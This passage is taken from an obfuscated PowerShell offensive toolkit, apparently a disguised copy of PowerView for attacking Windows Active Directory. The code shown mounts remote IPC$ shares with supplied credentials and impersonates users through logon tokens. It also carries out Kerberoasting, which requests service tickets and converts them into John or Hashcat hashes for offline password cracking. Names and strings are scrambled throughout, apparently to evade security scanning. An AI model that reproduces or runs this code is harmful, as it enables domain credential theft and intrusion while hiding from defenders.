        $UACValues.Add(( "{0}{2}{1}"-f 'P','ED','ASSWORD_EXPIR' ), 8388608  )
        $UACValues.AdD(( "{1}{4}{2}{5}{3}{7}{8}{0}{6}" -f'A','TR','T','_TO_AUTH','US','ED','TION','_FOR_D','ELEG' ), 16777216 )
        $UACValues.ADd(  ("{4}{3}{1}{0}{2}" -f 'ACC','RETS_','OUNT','EC','PARTIAL_S'), 67108864  )
    }

    PROCESS {
        $ResultUACValues  =  New-Object ('Sy'  +  'stem.Collec'+'tion'  +  's' +  '.Spec' +  'ialized.Ord' + 'e' +  'redDict'  +  'ionary')

        if ( $ShowAll  ) {
            ForEach (  $UACValue in $UACValues.GetEnUmErAToR( ) ) {
                if ( ($Value -band $UACValue.valUE  ) -eq $UACValue.vaLUe ) {
                    $ResultUACValues.ADd($UACValue.nAmE, "$($UACValue.Value)+"  )
                }
                else {
                    $ResultUACValues.Add($UACValue.Name, "$($UACValue.Value)"  )
                }
            }
        }
        else {
            ForEach ( $UACValue in $UACValues.gEtEnumErAtOr(   )) {
                if (  ( $Value -band $UACValue.vAlUE  ) -eq $UACValue.vaLuE ) {
                    $ResultUACValues.AdD($UACValue.nAme, "$($UACValue.Value)" )
                }
            }
        }
        $ResultUACValues
    }
}


function GE`T-P`RiN`cipalC`O`NTexT {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{2}{0}"-f 'Process','PSS','hould'}, '')]
    [CmdletBinding(  )]
    Param(
        [Parameter(  POsITiON  =   0, MANdAtOrY  =  $True  )]
        [Alias( {"{2}{0}{1}" -f 'roupNa','me','G'}, {"{1}{2}{0}"-f 'pIdentity','G','rou'})]
        [String]
        $Identity,

        [ValidateNotNullOrEmpty(  )]
        [String]
        $Domain,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute(  )]
        $Credential  = [Management.Automation.PSCredential]::Empty
    )

    Add-Type -AssemblyName ('S' +'ys'+ 'tem.' +  'DirectoryS' +'ervice'  +'s.Ac'  + 'cou'  + 'ntManagement'  )

    try {
        if (  $PSBoundParameters[( "{0}{1}"-f'D','omain'  )] -or ($Identity -match (( (  "{0}{1}"-f'.+lLkl','Lk.+'  )) -REplACe'lLk',[chAR]92  ) )  ) {
            if (  $Identity -match ( ( ( "{1}{2}{0}"-f 'haqhaq.+','.','+' )).rePlace( (  [CHar]104+  [CHar]97+ [CHar]113  ),[stRINg][CHar]92  )) ) {
                
                $ConvertedIdentity   = $Identity  |  Convert-ADName -OutputType ( 'Canonic'  +'a'  + 'l' )
                if ($ConvertedIdentity) {
                    $ConnectTarget  =  $ConvertedIdentity.SUBSTrInG(0, $ConvertedIdentity.INdEXof( '/'  )  )
                    $ObjectIdentity =  $Identity.spLIt(  '\')[1]
                    Write-Verbose ( '[Get-Princip'  + 'al'+  'Conte' +  'xt]'+  ' '+'Binding'+ ' '+ 't'  + 'o ' +  'd'  +'omai'  + 'n '+  "'$ConnectTarget'")
                }
            }
            else {
                $ObjectIdentity   =   $Identity
                Write-Verbose (  '[Get'  +  '-'+'Pri'+'ncipal'  + 'Co'  +'ntext]'  + ' '  + 'Bind'  +'i' +'ng '+ 'to'  +' ' +  'dom'  +  'ain '  +"'$Domain'"  )
                $ConnectTarget   =   $Domain
            }

            if ( $PSBoundParameters[(  "{0}{3}{1}{2}" -f'Cr','de','ntial','e')] ) {
                Write-Verbose ("{11}{5}{3}{12}{8}{0}{10}{9}{7}{2}{4}{1}{6}"-f ']','tia','re','t-','den','e','ls','ate c','Context','ern',' Using alt','[G','Principal' )
                $Context   =   New-Object -TypeName ( 'System.Di'+ 'r'+  'ectorySer'+  'vices.Account'+  'Ma' +  'n'+ 'agement'  +'.Princ'+'ipa' + 'lContext') -ArgumentList ( [System.DirectoryServices.AccountManagement.ContextType]::DOMAIN, $ConnectTarget, $Credential.USErNAMe, $Credential.GetnetWORkCReDeNTIaL( ).PAsSWOrD )
            }
            else {
                $Context =   New-Object -TypeName ('System.Directory'+  'S' +  'er' + 'v'  +  'i'+  'c'  +'e'  +'s' +'.Ac'+ 'countMan'  + 'agement.Pr' +'i'  + 'ncip'+ 'alC'  +'ont'  +'ext') -ArgumentList (  [System.DirectoryServices.AccountManagement.ContextType]::doMAiN, $ConnectTarget)
            }
        }
        else {
            if ( $PSBoundParameters[( "{0}{1}{2}"-f'C','re','dential'  )] ) {
                Write-Verbose ("{2}{8}{5}{4}{6}{0}{3}{1}{7}"-f 'Usi','ernate credential','[Get','ng alt','lCo','incipa','ntext] ','s','-Pr'  )
                $DomainName   =   Get-Domain  |   Select-Object -ExpandProperty ( 'Na' + 'me')
                $Context =  New-Object -TypeName (  'S' + 'ystem.DirectoryS' +  'ervic'  + 'es.Ac'  +  'c' +'ount'+  'M'  +  'ana'  +  'ge'+  'me'+  'nt.P' +  'rinc' +'ipalCont'+'ext') -ArgumentList ( [System.DirectoryServices.AccountManagement.ContextType]::dOmAiN, $DomainName, $Credential.UsERnaMe, $Credential.gETNeTWORkcrEdeNTIAl( ).PaSSWorD  )
            }
            else {
                $Context  =   New-Object -TypeName (  'Sys' +'tem.Di'+'rec'  + 'toryServices' + '.Acc' + 'ountM'  +  'a'+  'n'+  'agemen' + 't.Princip'  + 'alCon'+'text' ) -ArgumentList ( [System.DirectoryServices.AccountManagement.ContextType]::DoMaIn )
            }
            $ObjectIdentity  = $Identity
        }

        $Out   = New-Object (  'PSO'+ 'b' +  'ject' )
        $Out   |  Add-Member ( 'Not'+  'epr'+'ope' + 'rty'  ) (  "{1}{2}{0}" -f'xt','Con','te') $Context
        $Out | Add-Member ( 'Notepr'  +'o'+ 'pert'+'y') ( "{0}{2}{1}"-f 'Id','tity','en') $ObjectIdentity
        $Out
    }
    catch {
        Write-Warning ( '[G'  + 'et'  +  '-P'  +  'rincipa' +'lC'  +'onte'+ 'xt] '+ 'E'+'rror '  + 'cre'  + 'ati'  +  'ng '+ 'b' +'indin'+ 'g ' +'fo'  +  'r ' +  'obj'  +  'ect '+  "('$Identity') " +  'c' +'ontex'  +'t ' + ': ' +  "$_" )
    }
}


function Ad`d-R`EmOTeCO`NnEcTI`On {


    [CmdletBinding(DEFaUlTpArAMeTErseTnamE =  {"{2}{0}{1}{3}" -f 'om','puterNa','C','me'})]
    Param(
        [Parameter(  pOsITiOn   =  0, MaNDATORy  =  $True, PARAmetErsEtnAME   =   "c`oMPUTeRn`AME", VaLUeFROmPIpELine  = $True, VaLueFrOMPIpeLINEBypRopERtyNaMe   =  $True )]
        [Alias({"{2}{1}{0}" -f'stName','o','H'}, {"{0}{1}{3}{2}"-f 'd','ns','tname','hos'}, {"{1}{0}" -f'e','nam'} )]
        [ValidateNotNullOrEmpty(    )]
        [String[]]
        $ComputerName,

        [Parameter( PosiTion = 0, PArAmeteRSETnAME  = "Pa`TH", maNdatorY   =  $True )]
        [ValidatePattern(  {(("{4}{2}{1}{5}{0}{3}"-f'*hb1h','b1h','h','b1.*','hb1hb1','b1.' )).rePLAce( 'hb1','\'  )} )]
        [String[]]
        $Path,

        [Parameter(  MANdATORy  =   $True  )]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential
    )

    BEGIN {
        $NetResourceInstance  = [Activator]::cReaTEiNSTancE(  $NETRESOURCEW)
        $NetResourceInstance.DwtYpe  =  1
    }

    PROCESS {
        $Paths  =   @(  )
        if ( $PSBoundParameters[( "{0}{2}{1}"-f 'Co','me','mputerNa')] ) {
            ForEach (  $TargetComputerName in $ComputerName  ) {
                $TargetComputerName  = $TargetComputerName.trIM(  '\'  )
                $Paths += ,"\\$TargetComputerName\IPC$"
            }
        }
        else {
            $Paths += ,$Path
        }

        ForEach (  $TargetPath in $Paths ) {
            $NetResourceInstance.LPReMOTEnAme  =  $TargetPath
            Write-Verbose ( '[Ad' +'d-Remote'  + 'C'+  'onnect'+'i' +  'on] '+  'Att'  + 'em'+'pting ' + 't'+  'o '+'moun' + 't'+ ': '  +  "$TargetPath"  )

            
            
            $Result = $Mpr::WnETADdCoNnection2w($NetResourceInstance, $Credential.getneTwORKcREdENTiaL(   ).pASswORD, $Credential.USeRNAmE, 4 )

            if ($Result -eq 0) {
                Write-Verbose ("$TargetPath " + 's' + 'ucc' +'essfully '  +'m'+  'o'+ 'unted')
            }
            else {
                Throw "[Add-RemoteConnection] error mounting $TargetPath : $(([ComponentModel.Win32Exception]$Result).Message) "
            }
        }
    }
}


function remoVE-Rem`Ot`e`COnNEC`T`Ion {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(  {"{5}{0}{3}{8}{7}{9}{6}{4}{2}{1}"-f'or','s','ction','St','un','PSUseShouldProcessF','F','eChang','at','ing'}, '')]
    [CmdletBinding(  DEfAULTpARAmetERSETNaMe =   {"{3}{1}{2}{0}" -f'ame','uter','N','Comp'}  )]
    Param(
        [Parameter(POSItIOn =   0, mAndATOrY =  $True, PARAmEtERseTnaME  =  "cO`mPU`TERn`Ame", VAluEfRoMpiPElInE =   $True, vAluEfRomPIpElINeBypROpErTynAMe =  $True  )]
        [Alias( {"{1}{0}{2}"-f 'Nam','Host','e'}, {"{3}{0}{2}{1}" -f'shostna','e','m','dn'}, {"{1}{0}" -f 'ame','n'} )]
        [ValidateNotNullOrEmpty(   )]
        [String[]]
        $ComputerName,

        [Parameter(  positioN   =  0, ParaMETERsEtNAMe   =  "p`Ath", manDaTOrY   =  $True)]
        [ValidatePattern({((  "{0}{3}{2}{4}{1}{5}" -f 'L','LvU','LvULvULv','vU','U.*LvU','.*'  )  ).REplacE(  ([CHar]76 + [CHar]118  +  [CHar]85  ),'\'  )})]
        [String[]]
        $Path
      )

    PROCESS {
        $Paths =   @(  )
        if (  $PSBoundParameters[( "{1}{0}{3}{2}" -f'mpu','Co','ame','terN')] ) {
            ForEach (  $TargetComputerName in $ComputerName ) {
                $TargetComputerName =   $TargetComputerName.tRiM('\')
                $Paths += ,"\\$TargetComputerName\IPC$"
            }
        }
        else {
            $Paths += ,$Path
        }

        ForEach (  $TargetPath in $Paths  ) {
            Write-Verbose ( '[R'+  'emove-' +'Remot'  +  'eConnection]'+' ' + 'At'+  'temp' + 'ting '  +  'to' + ' ' +'u'+ 'nmo'+ 'unt: '  +"$TargetPath" )
            $Result = $Mpr::wnetCaNcElCONNeCtiOn2(  $TargetPath, 0, $True  )

            if ( $Result -eq 0  ) {
                Write-Verbose ("$TargetPath "+  's'+'uccess' +  'fully '  + 'u' +'mm' +  'ounted' )
            }
            else {
                Throw "[Remove-RemoteConnection] error unmounting $TargetPath : $(([ComponentModel.Win32Exception]$Result).Message) "
            }
        }
    }
}


function iNv`O`KE-`U`S`eRim`pErsONATiON {


    [OutputType( [IntPtr]  )]
    [CmdletBinding( defaultpaRametErSETnaME =   {"{2}{1}{0}" -f 'ial','dent','Cre'}  )]
    Param(
        [Parameter(ManDAtOry   = $True, pARameteRsEtnaME  = "Cr`Ed`entIAL")]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute(  )]
        $Credential,

        [Parameter(  mANdAtORY = $True, PaRaMETerSETnAMe   =   "to`kEn`hanDle"  )]
        [ValidateNotNull(    )]
        [IntPtr]
        $TokenHandle,

        [Switch]
        $Quiet
     )

    if (  ([System.Threading.Thread]::cUrrEntTHrEAd.gEtAPartMenTStaTE() -ne 'STA' ) -and (-not $PSBoundParameters[("{1}{0}"-f 'uiet','Q'  )])) {
        Write-Warning ( "{14}{20}{16}{3}{8}{11}{10}{26}{18}{24}{21}{19}{23}{22}{17}{1}{9}{25}{5}{12}{15}{4}{7}{13}{2}{0}{6}"-f'not ','par','ay ','e-U','im','nt state','work.','pers','s','tm','t','erImpersona',', token','onation m','[',' ','ok','ently in a single-threaded a','n] powers','e','Inv','l.',' is not curr','xe','hel','e','io' )
    }

    if ( $PSBoundParameters[(  "{2}{0}{1}" -f'okenHand','le','T' )]  ) {
        $LogonTokenHandle  =   $TokenHandle
    }
    else {
        $LogonTokenHandle  =   [IntPtr]::ZeRo
        $NetworkCredential =   $Credential.gEtNEtwORkcrEdEntial(   )
        $UserDomain   = $NetworkCredential.DOmaiN
        $UserName =   $NetworkCredential.USernamE
        Write-Warning "[Invoke-UserImpersonation] Executing LogonUser() with user: $($UserDomain)\$($UserName) "

        
        
        $Result  =   $Advapi32::LogOnuseR( $UserName, $UserDomain, $NetworkCredential.PasswOrd, 9, 3, [ref]$LogonTokenHandle )  ;$LastError   =  [System.Runtime.InteropServices.Marshal]::GetlasTwiN32ERrOR( )  ;  

        if ( -not $Result) {
            throw "[Invoke-UserImpersonation] LogonUser() Error: $(([ComponentModel.Win32Exception] $LastError).Message) "
        }
    }

    
    $Result = $Advapi32::ImPersONatEloGGedoNUser(  $LogonTokenHandle  )

    if (-not $Result) {
        throw "[Invoke-UserImpersonation] ImpersonateLoggedOnUser() Error: $(([ComponentModel.Win32Exception] $LastError).Message) "
    }

    Write-Verbose (  "{5}{0}{2}{13}{8}{10}{3}{6}{7}{12}{9}{1}{14}{15}{11}{4}"-f 'ke-Use','ull','rIm','lte','ated','[Invo','rn','ate ','tion','redentials successf','] A','n','c','persona','y impe','rso'  )
    $LogonTokenHandle
}


function I`NVOKE-rE`Ve`Rt`ToS`eLf {


    [CmdletBinding(  )]
    Param( 
        [ValidateNotNull(  )]
        [IntPtr]
        $TokenHandle
     )

    if ($PSBoundParameters[("{1}{0}{2}" -f'dl','TokenHan','e'  )]) {
        Write-Warning ("{9}{13}{10}{5}{3}{11}{2}{4}{8}{12}{7}{1}{6}{14}{0}" -f 'le','losing ','i','Re','ng token impers','vertToSelf] ','Logon','d c','onation a','[I','voke-Re','vert','n','n','User() token hand'  )
        $Result =   $Kernel32::ClOSEHANdle($TokenHandle )
    }

    $Result  =   $Advapi32::rEVERtTOSelf(    )  ;$LastError   = [System.Runtime.InteropServices.Marshal]::GETlastwIN32ErROR(    ) ;  

    if (  -not $Result  ) {
        throw "[Invoke-RevertToSelf] RevertToSelf() Error: $(([ComponentModel.Win32Exception] $LastError).Message) "
    }

    Write-Verbose (  "{16}{0}{15}{11}{1}{13}{6}{14}{3}{7}{4}{5}{18}{2}{8}{10}{12}{9}{17}" -f'ke','t','u','en ','s','onati','oSel','imper','cc','ve','essful','r','ly re','T','f] Tok','-Reve','[Invo','rted','on s'  )
}


function Ge`T-`do`MAi`NspNTickeT {


    [OutputType(  {"{0}{2}{4}{3}{1}"-f 'Po','icket','we','w.SPNT','rVie'} )]
    [CmdletBinding(dEfAultpARAmeTeRsetnamE  = {"{0}{2}{1}" -f 'Raw','PN','S'} )]
    Param (  
        [Parameter( pOsitION   =  0, pArAmeTerSetNAME   =  "RaW`sPn", MaNDATORY =  $True, VALueFrompiPelINE =  $True  )]
        [ValidatePattern( {"{1}{0}"-f '*','.*/.'})]
        [Alias(  {"{0}{5}{3}{1}{4}{2}" -f'Ser','r','palName','iceP','inci','v'}  )]
        [String[]]
        $SPN,

        [Parameter(  POSitiON = 0, PaRAMEterSETnAme  =  "u`SER", mANDatoRy   = $True, vaLUeFrOMpIpeLinE  =   $True  )]
        [ValidateScript({ $_.PSoBJECt.tYpeNAmes[0] -eq ( "{1}{2}{3}{0}"-f'er','PowerVie','w.','Us'  ) })]
        [Object[]]
        $User,

        [ValidateSet( {"{0}{1}"-f'Joh','n'}, {"{0}{1}"-f'Has','hcat'}  )]
        [Alias({"{0}{1}{2}"-f 'Fo','rma','t'} )]
        [String]
        $OutputFormat =  ("{1}{2}{0}" -f 't','Has','hca'  ),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute(   )]
        $Credential   =   [Management.Automation.PSCredential]::emPty
     )

    BEGIN {
        $Null  =  [Reflection.Assembly]::loADWiTHpArTIAlName(  (  "{0}{3}{2}{5}{1}{4}"-f 'Syst','ty','den','em.I','Model','ti'))

        if (  $PSBoundParameters[("{2}{1}{0}" -f'ial','redent','C'  )]) {
            $LogonToken =  Invoke-UserImpersonation -Credential $Credential
        }
    }

    PROCESS {
        if ( $PSBoundParameters[( "{1}{0}"-f 'er','Us')]  ) {
            $TargetObject   = $User
        }
        else {
            $TargetObject =  $SPN
        }

        ForEach (  $Object in $TargetObject  ) {
            if ( $PSBoundParameters[("{1}{0}"-f 'er','Us')] ) {
                $UserSPN =  $Object.SerVICePRInCIpalName
                $SamAccountName  =   $Object.SAmaCCOUNTName
                $DistinguishedName   = $Object.DiStingUISHeDName
            }
            else {
                $UserSPN  =   $Object
                $SamAccountName   =  (  "{2}{1}{0}"-f'OWN','KN','UN')
                $DistinguishedName  =  ( "{0}{1}" -f 'UNKNOW','N' )
            }

            
            if (  $UserSPN -is [System.DirectoryServices.ResultPropertyValueCollection]  ) {
                $UserSPN  = $UserSPN[0]
            }

            try {
                $Ticket =   New-Object (  'S' +'ystem.I'  +  'dentityMo'  +'d'  + 'el.'  +  'T'  +'ok' + 'ens.Ker'  +  'bero' +  's' +'Reques' +  'torS'  +  'ecurityTok' +'en') -ArgumentList $UserSPN
            }
            catch {
                Write-Warning ( '[G' +'e' +'t-D' +  'o'+'mainSPNTi'  + 'ck'  + 'et] '  +'Er'+'ror '+  'r'+  'e'+ 'questin' +  'g '+  'ticke'+  't '+  'for'  + ' '+ 'SP' + 'N '+"'$UserSPN' "  + 'from'  +  ' '+  'use'  +  'r ' +  "'$DistinguishedName' " +  ': ' +  "$_")
            }
            if (  $Ticket  ) {
                $TicketByteStream   = $Ticket.gETRequest(  )
            }
            if (  $TicketByteStream  ) {
                $Out = New-Object ( 'PSO'+ 'bje'+  'ct')

                $TicketHexStream   =   [System.BitConverter]::TOSTRinG(  $TicketByteStream ) -replace '-'

                $Out  |   Add-Member ( 'Notepr'+ 'o'  +  'pe'+  'rty' ) ("{0}{2}{1}" -f'Sam','e','AccountNam') $SamAccountName
                $Out   | Add-Member (  'N' + 'oteprope' +'rty'  ) (  "{1}{0}{3}{4}{2}" -f'st','Di','uishedName','in','g' ) $DistinguishedName
                $Out   |   Add-Member (  'Noteprop' +'er' +  'ty' ) (  "{3}{1}{2}{0}" -f 'e','ervicePrinc','ipalNam','S'  ) $Ticket.sERVICepRInCipalNamE

                
                
                if($TicketHexStream -match 'a382....3082....A0030201(?<EtypeLen>..)A1.{1,4}.......A282(?<CipherTextLen>....)........(?<DataToEnd>.+)'  ) {
                    $Etype  = [Convert]::toBytE(   $Matches.ETyPeLEN, 16  )
                    $CipherTextLen  = [Convert]::touiNt32( $Matches.cIPHErTExTlen, 16 )-4
                    $CipherText  =   $Matches.daTatOEND.SubSTring( 0,$CipherTextLen*2 )

                    
                    if(  $Matches.DatatoenD.sUBSTriNg( $CipherTextLen*2, 4  ) -ne ( "{0}{1}"-f 'A48','2'  )  ) {
                        Write-Warning "Error parsing ciphertext for the SPN  $($Ticket.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq "
                        $Hash   =  $null
                        $Out   |  Add-Member (  'Note'  + 'prop' + 'e'  + 'rty' ) ("{3}{0}{1}{4}{2}"-f'i','c','eHexStream','T','ketByt' ) ( [Bitconverter]::tosTRiNG($TicketByteStream ).rEplaCE(  '-',''  ) )
                    } else {
                        $Hash  =   "$($CipherText.Substring(0,32))`$$($CipherText.Substring(32))"
                        $Out |   Add-Member ( 'Note' +  'prope' +'rty' ) ("{3}{1}{0}{2}" -f'tByteHexStre','e','am','Tick' ) $null
                    }
                } else {
                    Write-Warning "Unable to parse ticket structure for the SPN  $($Ticket.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq "
                    $Hash  =   $null
                    $Out   |  Add-Member ( 'Note'+  'prope'  + 'rty'  ) ("{3}{2}{0}{1}{4}"-f 'teH','e','icketBy','T','xStream'  ) ( [Bitconverter]::toStriNg($TicketByteStream).REPlace(  '-','' ))
                }

                if(  $Hash) {
                    
                    if (  $OutputFormat -match ( "{0}{1}"-f 'J','ohn' )) {
                        $HashFormat  =   "`$krb5tgs`$$($Ticket.ServicePrincipalName):$Hash"
                    }
                    else {
                        if (  $DistinguishedName -ne ("{0}{1}{2}"-f'UN','KNO','WN'  )) {
                            $UserDomain   =   $DistinguishedName.SubString(  $DistinguishedName.inDexoF('DC=')  ) -replace 'DC=','' -replace ',','.'
                        }
                        else {
                            $UserDomain   = ("{1}{0}" -f 'KNOWN','UN'  )
                        }

                        
                        $HashFormat   =   "`$krb5tgs`$$($Etype)`$*$SamAccountName`$$UserDomain`$$($Ticket.ServicePrincipalName)*`$$Hash"
                    }
                    $Out  |   Add-Member ('No'+  'tepr'+  'opert' +'y'  ) ("{1}{0}" -f 'sh','Ha'  ) $HashFormat
                }

                $Out.psoBJeCT.TypeNAMes.insert(  0, ("{4}{1}{3}{5}{0}{2}" -f'.SPNTicke','owe','t','r','P','View'  )  )
                $Out
            }
        }
    }

    END {
        if ($LogonToken ) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function InV`Oke-k`E`RB`eROASt {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute( {"{1}{0}{3}{2}" -f 'P','PSShould','ocess','r'}, '' )]
    [OutputType( {"{3}{2}{1}{4}{0}"-f 'PNTicket','View.','er','Pow','S'})]
    [CmdletBinding(    )]
    Param(  
        [Parameter( poSition  = 0, VaLUeFrompIpeLINe =   $True, VALUEfROmPIPeLinebypROPERTyNAME  =  $True  )]
        [Alias({"{0}{2}{1}{4}{3}" -f'Distingu','s','i','e','hedNam'}, {"{0}{3}{1}{2}"-f'S','mAccountNa','me','a'}, {"{0}{1}" -f 'Na','me'}, {"{1}{3}{2}{0}{4}" -f 'rDistinguishedNa','M','e','emb','me'}, {"{1}{0}{2}" -f 'e','M','mberName'})]
        [String[]]
        $Identity,

        [ValidateNotNullOrEmpty(   )]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias( {"{1}{0}" -f'ter','Fil'})]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty(  )]
        [Alias(  {"{0}{1}{2}" -f 'A','DSP','ath'}  )]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty( )]
        [Alias( {"{3}{2}{1}{0}"-f 'ler','l','inContro','Doma'}  )]
        [String]
        $Server,

        [ValidateSet( {"{0}{1}"-f'B','ase'}, {"{1}{0}"-f 'neLevel','O'}, {"{1}{0}{2}"-f'u','S','btree'} )]
        [String]
        $SearchScope = (  "{1}{2}{0}"-f 'ee','Subt','r' ),

        [ValidateRange( 1, 10000  )]
        [Int]
        $ResultPageSize =   200,

        [ValidateRange(1, 10000 )]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [ValidateSet( {"{0}{1}"-f 'Joh','n'}, {"{2}{0}{1}" -f'ashca','t','H'})]
        [Alias({"{0}{1}{2}"-f'F','orm','at'} )]
        [String]
        $OutputFormat =   (  "{1}{2}{0}"-f 'at','Hash','c' ),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential  = [Management.Automation.PSCredential]::EmPty
      )

    BEGIN {
        $UserSearcherArguments  =   @{
            'SPN'   = $True
            ("{0}{2}{1}"-f 'Proper','es','ti' )  =  ("{5}{14}{10}{8}{13}{12}{9}{0}{7}{6}{11}{3}{4}{1}{2}"-f 'shed','am','e','iceprincipa','ln','s','e,s','nam','ntname,dist','i','ccou','erv','u','ing','ama'  )
        }
        if (  $PSBoundParameters[( "{1}{0}"-f'main','Do' )]  ) { $UserSearcherArguments[(  "{0}{1}" -f'Dom','ain' )] = $Domain }
        if ( $PSBoundParameters[("{0}{2}{1}" -f'LDAPF','lter','i'  )]) { $UserSearcherArguments[(  "{0}{2}{1}" -f 'L','er','DAPFilt')]   =  $LDAPFilter }
        if (  $PSBoundParameters[(  "{0}{2}{1}" -f 'Searc','ase','hB' )]) { $UserSearcherArguments[("{1}{0}{2}" -f'Ba','Search','se' )] =   $SearchBase }
        if ( $PSBoundParameters[("{1}{0}" -f 'rver','Se')] ) { $UserSearcherArguments[(  "{2}{0}{1}" -f'erv','er','S' )]  =  $Server }
        if (  $PSBoundParameters[("{0}{2}{1}{3}"-f'Search','op','Sc','e' )]  ) { $UserSearcherArguments[("{1}{2}{0}"-f'cope','Sear','chS'  )] =   $SearchScope }
        if (  $PSBoundParameters[( "{3}{0}{1}{2}"-f 'ag','eS','ize','ResultP'  )] ) { $UserSearcherArguments[(  "{1}{0}{3}{2}" -f 'ultPage','Res','ize','S')]  =  $ResultPageSize }
        if (  $PSBoundParameters[("{3}{2}{0}{1}" -f 'imi','t','erTimeL','Serv'  )]  ) { $UserSearcherArguments[( "{0}{1}{2}"-f'ServerTimeLim','i','t')]   = $ServerTimeLimit }
        if (  $PSBoundParameters[("{0}{1}{2}"-f'Tom','bs','tone'  )]) { $UserSearcherArguments[("{0}{1}"-f'Tombsto','ne'  )]  = $Tombstone }
        if (  $PSBoundParameters[("{0}{1}{2}"-f 'Cred','ent','ial' )]  ) { $UserSearcherArguments[(  "{2}{0}{1}"-f'd','ential','Cre'  )]  =   $Credential }

        if ( $PSBoundParameters[(  "{0}{1}{2}" -f 'C','redentia','l')] ) {
            $LogonToken = Invoke-UserImpersonation -Credential $Credential
        }
    }

    PROCESS {
        if ($PSBoundParameters[("{1}{0}{2}"-f 'ti','Iden','ty' )]) { $UserSearcherArguments[("{2}{1}{0}" -f'ty','denti','I')]   = $Identity }
        Get-DomainUser @UserSearcherArguments |  Where-Object {$_.sAmACcOUnTNamE -ne ( "{1}{2}{0}" -f 't','krb','tg' )}   |  Get-DomainSPNTicket -OutputFormat $OutputFormat
    }

    END {
        if ($LogonToken  ) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function gET`-p`ATHACl {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{0}{3}{2}"-f 'SSho','P','dProcess','ul'}, '')]
    [OutputType(  {"{4}{3}{1}{2}{0}" -f 'leACL','w.','Fi','erVie','Pow'} )]
    [CmdletBinding(  )]
    Param( 
        [Parameter(  mAnDAtoRy =  $True, vaLUEFRoMPIpElInE =  $True, vALueFromPiPeLiNeBYPROpErTYnamE =   $True  )]
        [Alias( {"{0}{1}"-f 'FullNa','me'} )]
        [String[]]
        $Path,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute(  )]
        $Credential   =   [Management.Automation.PSCredential]::Empty
    )

    BEGIN {

        function cOnVE`R`T-FIL`eRi`ght {
            
            [CmdletBinding(  )]
            Param( 
                [Int]
                $FSR
              )

            $AccessMask  =  @{
                [uint32]( "{1}{2}{3}{0}"-f '0','0','x8000','000' )   =   ( "{2}{1}{3}{0}" -f 'ad','R','Generic','e' )
                [uint32](  "{1}{0}{2}"-f 'x40','0','000000')  =   (  "{1}{2}{3}{0}"-f 'te','Gene','ric','Wri' )
                [uint32](  "{1}{0}{2}" -f '0','0x2','000000'  )  = ( "{4}{2}{1}{3}{0}"-f'ute','Exe','eneric','c','G' )
                [uint32]( "{2}{3}{0}{1}" -f '000000','0','0x','1')   =  ( "{2}{0}{1}"-f'ne','ricAll','Ge' )
                [uint32]( "{0}{2}{1}" -f'0x','2000000','0')   = ( "{0}{1}{2}" -f 'Max','imumAl','lowed' )
                [uint32]("{2}{1}{0}" -f '0','000','0x0100')   = ( "{1}{4}{0}{3}{2}" -f 'emSec','A','ty','uri','ccessSyst'  )
                [uint32](  "{1}{3}{0}{2}"-f'010','0x','0000','0')  = ("{1}{2}{3}{0}"-f'nize','Synch','r','o'  )
                [uint32](  "{2}{1}{0}" -f '080000','00','0x'  )  =   ( "{0}{2}{1}"-f 'Wr','eOwner','it')
                [uint32]( "{1}{0}{2}" -f 'x0004000','0','0')   =  (  "{2}{0}{1}" -f'i','teDAC','Wr'  )
                [uint32](  "{2}{0}{1}"-f 'x0002','0000','0')   =   ("{3}{1}{0}{2}" -f 'dCont','ea','rol','R' )
                [uint32]( "{0}{3}{2}{1}" -f '0','010000','0','x0')   = ( "{1}{0}{2}" -f 'ele','D','te')
                [uint32]( "{0}{2}{1}"-f '0','0100','x0000')  =   ( "{3}{1}{2}{0}" -f 's','bu','te','WriteAttri'  )
                [uint32](  "{0}{1}{2}"-f '0','x0000008','0') =   (  "{2}{1}{0}" -f 'Attributes','ead','R')
                [uint32](  "{0}{2}{1}"-f'0x000','040','00'  )   = ( "{0}{2}{1}"-f'Delet','Child','e')
                [uint32]("{0}{2}{3}{1}"-f '0x0000','0','0','02'  ) =   ( "{1}{2}{3}{4}{0}" -f 'se','E','xecute/T','r','aver' )
                [uint32]( "{2}{0}{1}" -f'0','0000010','0x'  ) =  ( "{4}{0}{2}{3}{5}{1}" -f'Extend','tes','e','dAttr','Write','ibu')
                [uint32]("{2}{0}{1}{3}"-f'0000','00','0x','08')   = (  "{2}{3}{1}{4}{0}"-f 'utes','ed','Re','adExtend','Attrib')
                [uint32]( "{1}{2}{0}" -f '004','0x0000','0'  ) = ("{5}{3}{1}{6}{0}{2}{4}" -f 'ubdi','ndD','rect','ppe','ory','A','ata/AddS'  )
                [uint32]("{1}{2}{0}" -f'0002','0x00','00'  )  = ( "{0}{3}{2}{1}" -f'Wr','dFile','a/Ad','iteDat'  )
                [uint32]( "{3}{0}{1}{2}"-f 'x','000','00001','0') =   ("{5}{0}{4}{2}{3}{1}{6}" -f'at','r','tD','irecto','a/Lis','ReadD','y')
            }

            $SimplePermissions   = @{
                [uint32]( "{1}{0}"-f '1f01ff','0x' )   =   ( "{2}{1}{3}{0}"-f'ol','u','F','llContr'  )
                [uint32]( "{1}{0}" -f'bf','0x0301')   =   ( "{1}{0}" -f 'fy','Modi' )
                [uint32]("{1}{2}{0}" -f '200a9','0x','0'  )  =  (  "{1}{0}{3}{4}{2}"-f 'ad','Re','te','A','ndExecu' )
